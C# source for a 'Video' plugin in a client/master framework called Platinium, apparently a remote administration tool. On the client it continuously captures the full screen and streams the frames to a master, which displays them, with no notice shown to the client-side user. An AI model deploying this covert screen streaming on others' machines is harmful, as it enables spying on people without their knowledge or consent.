using Platinium.Shared.Data.Network;
using Platinium.Shared.Data.Packages;
using Platinium.Shared.Plugin;
using PluginVideo;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Controls;
using System.Windows.Forms;
using System.Windows.Shapes;

[Metadata(Name = "Video", Version = "1", Description = "Takes videos")]
public class Plugin : IPluginImplementation
{
    public dynamic Interface { get; set; }

    public PluginClientController ClientController { get; set; }
    public PluginMasterController MasterController { get; set; }
    public System.Windows.Forms.UserControl PluginInterface { get; set; }

    public Plugin(dynamic obj)
    {
        Interface = obj;
    }

    public void InstantiateClient()
    {
        ClientController = new PluginClientSide();
    }

    public void InstantiateMaster()
    {
        MasterController = new PluginMasterSide(this);
    }
}
public class PluginClientSide : PluginClientController
{
    public Package Action(Package inPackage)
    {
        while (true)
        {
            byte[] imageBytes = null;
            System.Drawing.Rectangle bounds = Screen.GetBounds(Point.Empty);
            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                }
                ImageConverter converter = new ImageConverter();
                imageBytes = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
            }
            Thread.Sleep(100);
            NetworkManagement.WriteData(NetworkManagement.NetworkStream, new Package(inPackage.Command, imageBytes, Platinium.Shared.Content.PackageType.PluginCommand, inPackage.To, inPackage.From, null));
        }
        return null;
    }
}
public class PluginMasterSide : PluginMasterController
{
    private PictureForm pictureForm;
    private bool isOpen = false;
    public PluginMasterSide(IPluginImplementation plugin) : base(plugin)
    {
        PluginInstance = plugin;
        pictureForm = new PictureForm(this);
    }

    public Package Action(Package inPackage)
    {
        IsInUse = true;
        if (isOpen)
        {
            pictureForm.RefreshImage(System.Drawing.Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
        }
        else
        {
            isOpen = true;
            pictureForm.RefreshImage(System.Drawing.Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
            Thread mThread = new Thread(delegate ()
            {
                pictureForm.ShowDialog();
            });

            mThread.SetApartmentState(ApartmentState.STA);

            mThread.Start();
        }
        //Image.FromStream(new MemoryStream((byte[])inPackage.Content)).Save(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().ToString()), "images", Path.GetRandomFileName() + ".jpg"));


        //Package returnPackage = new Package(inPackage.Command, null, Platinium.Shared.Content.PackageType.PluginCommand, inPackage.To, inPackage.From, null);
        //return returnPackage;
        return null;
    }
}
